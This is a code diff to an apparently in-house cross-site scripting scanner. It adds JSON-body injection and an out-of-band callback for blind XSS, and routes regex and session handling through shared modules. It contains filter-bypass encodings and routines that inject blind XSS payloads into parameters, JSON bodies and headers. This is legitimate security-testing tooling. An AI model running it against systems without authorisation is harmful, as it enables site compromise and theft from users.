@@ -27,6 +27,8 @@ from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from html.parser import HTMLParser
 
+from core.shared_infra import shared_session, regex_cache, PayloadInjector, oob_provider
+
 # ============================================================================
 # ANSI COLOR CODES
 # ============================================================================
@@ -266,7 +268,7 @@ ENCODING_BYPASSES = {
     "case_alternation": lambda p: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p)),
     "null_byte_insert": lambda p: p.replace('<', '<\x00').replace('>', '>\x00'),
     "tab_newline_insert": lambda p: p.replace(' ', '\t').replace('<', '<\n'),
-    "comment_break": lambda p: re.sub(r'(script|img|svg|body)', lambda m: m.group(0)[0]+'<!---->'+m.group(0)[1:], p, flags=re.IGNORECASE),
+    "comment_break": lambda p: regex_cache.compile(r'(script|img|svg|body)', re.IGNORECASE).sub(lambda m: m.group(0)[0]+'<!---->'+m.group(0)[1:], p),
 }
 
 # Common parameters to mine
@@ -338,13 +340,7 @@ class XSStrikeEngine:
 
     def __init__(self, session=None, timeout=10, retries=3, threads=5,
                  delay=0, verbose=True, proxy=None, callback_url=None):
-        self.session = session or requests.Session()
-        self.session.verify = False
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
-        if proxy:
-            self.session.proxies = {'http': proxy, 'https': proxy}
+        self.session = session or shared_session
         self.timeout = timeout
         self.retries = retries
         self.threads = threads
@@ -364,7 +360,7 @@ class XSStrikeEngine:
         """Generate unique marker for reflection detection"""
         rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
         self._marker = f"zylonxss{rand}"
-        self._marker_regex = re.compile(re.escape(self._marker), re.IGNORECASE)
+        self._marker_regex = regex_cache.compile(re.escape(self._marker), re.IGNORECASE)
 
     def _log(self, msg, level="info"):
         """Print colored log message"""
@@ -405,11 +401,16 @@ class XSStrikeEngine:
                 self._log(f"Request error: {str(e)[:60]}", "error")
         return None
 
-    def _inject_and_check(self, url, param, payload, method='GET', data=None):
+    def _inject_and_check(self, url, param, payload, method='GET', data=None, json_inject=False):
         """Inject payload and check for reflection"""
         try:
             encoded_payload = urllib.parse.quote(payload, safe='')
-            if method.upper() == 'POST':
+            if json_inject:
+                injection = PayloadInjector.inject_json(url, param, payload)
+                resp = self._send_request(injection['url'], method=injection['method'],
+                                         json=injection['json'],
+                                         headers=injection.get('headers', {}))
+            elif method.upper() == 'POST':
                 req_data = data.copy() if data else {}
                 req_data[param] = payload
                 resp = self._send_request(url, method='POST', data=req_data)
@@ -429,7 +430,7 @@ class XSStrikeEngine:
             if decoded_payload in resp.text:
                 return resp, True, "decoded"
             # Partial check (some chars filtered)
-            payload_stripped = re.sub(r'[<>"\']', '', payload)
+            payload_stripped = regex_cache.compile(r'[<>"\']').sub('', payload)
             if payload_stripped and len(payload_stripped) > 3 and payload_stripped in resp.text:
                 return resp, True, "partial"
             # Marker check
@@ -601,7 +602,7 @@ class XSStrikeEngine:
             rf'=>\s*\{{[^}}]*{re.escape(marker[:12])}',
         ]
         for p in js_patterns:
-            if re.search(p, text, re.IGNORECASE):
+            if regex_cache.search(p, text, re.IGNORECASE):
                 context = CONTEXT_JAVASCRIPT
                 break
 
@@ -615,9 +616,9 @@ class XSStrikeEngine:
                 rf'\w+\s*=\s*["\'][^"\']*{re.escape(marker[:12])}',
             ]
             for p in attr_patterns:
-                if re.search(p, text, re.IGNORECASE):
+                if regex_cache.search(p, text, re.IGNORECASE):
                     # Determine if it's a URL attribute
-                    if re.search(rf'(href|src|action)\s*=\s*["\'][^"\']*{re.escape(marker[:12])}',
+                    if regex_cache.search(rf'(href|src|action)\s*=\s*["\'][^"\']*{re.escape(marker[:12])}',
                                 text, re.IGNORECASE):
                         context = CONTEXT_URL
                     else:
@@ -632,7 +633,7 @@ class XSStrikeEngine:
                 rf'<%[^%]*{re.escape(marker[:12])}',
             ]
             for p in template_patterns:
-                if re.search(p, text, re.IGNORECASE):
+                if regex_cache.search(p, text, re.IGNORECASE):
                     context = CONTEXT_TEMPLATE
                     break
 
@@ -643,7 +644,7 @@ class XSStrikeEngine:
                 rf'<style[^>]*>[^<]*{re.escape(marker[:12])}',
             ]
             for p in css_patterns:
-                if re.search(p, text, re.IGNORECASE):
+                if regex_cache.search(p, text, re.IGNORECASE):
                     context = CONTEXT_CSS
                     break
 
@@ -873,7 +874,7 @@ class XSStrikeEngine:
         text = resp.text
 
         # Extract inline script blocks
-        script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', text,
+        script_blocks = regex_cache.findall(r'<script[^>]*>(.*?)</script>', text,
                                   re.IGNORECASE | re.DOTALL)
         results['details']['inline_scripts_analyzed'] = len(script_blocks)
 
@@ -887,7 +888,7 @@ class XSStrikeEngine:
                     rf'\b{re.escape(source_short)}\b',
                 ]
                 for p in patterns:
-                    if re.search(p, block):
+                    if regex_cache.search(p, block):
                         if source not in results['details']['sources_found']:
                             results['details']['sources_found'].append(source)
                         break
@@ -901,7 +902,7 @@ class XSStrikeEngine:
                         results['details']['sinks_found'].append(sink)
 
         # Also check for sources/sinks in event handlers within HTML attributes
-        event_handlers = re.findall(r'on\w+\s*=\s*["\']([^"\']+)["\']', text, re.IGNORECASE)
+        event_handlers = regex_cache.findall(r'on\w+\s*=\s*["\']([^"\']+)["\']', text, re.IGNORECASE)
         for handler in event_handlers:
             for source in DOM_SOURCES:
                 src_short = source.split('.')[-1] if '.' in source else source
@@ -947,7 +948,7 @@ class XSStrikeEngine:
             r'eval\s*\([^)]*(?:location|URL|href|search|hash)[^)]*\)',
         ]
         for pattern in doc_write_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
+            matches = regex_cache.findall(pattern, text, re.IGNORECASE)
             for match in matches:
                 results['vulnerable'] = True
                 results['findings'].append({
@@ -987,10 +988,11 @@ class XSStrikeEngine:
         }
 
         if not cb:
-            results['details']['note'] = "No callback URL provided. Use callback_url parameter."
-            self._log("No callback URL - blind XSS cannot be confirmed", "warning")
-            # Still inject payloads that might trigger later
-            cb = "https://callback.zylon.test/xss"
+            results['details']['note'] = "No callback URL provided. Falling back to OOB provider."
+            self._log("No callback URL - using OOB provider for blind XSS", "warning")
+            # Use OOB provider for callback instead of hardcoded fallback
+            payload_id = oob_provider.generate_payload_id()
+            cb = oob_provider.get_callback_url(payload_id)
 
         # Generate blind XSS payloads
         blind_payloads = [
@@ -1021,6 +1023,23 @@ class XSStrikeEngine:
                     'reflected': reflected,
                     'status': resp.status_code if resp else 'error',
                 })
+
+        # Also inject via JSON body for API endpoints
+        for param_name in params:
+            for payload in blind_payloads[:3]:
+                try:
+                    injection = PayloadInjector.inject_json(url, param_name, payload)
+                    resp = self._send_request(injection['url'], method=injection['method'],
+                                             json=injection['json'],
+                                             headers=injection.get('headers', {}))
+                    results['details']['injection_points'].append({
+                        'type': 'json_body',
+                        'param': param_name,
+                        'payload': payload[:80],
+                        'status': resp.status_code if resp else 'error',
+                    })
+                except Exception:
+                    pass
 
         # Also inject into HTTP headers
         header_injection_points = [
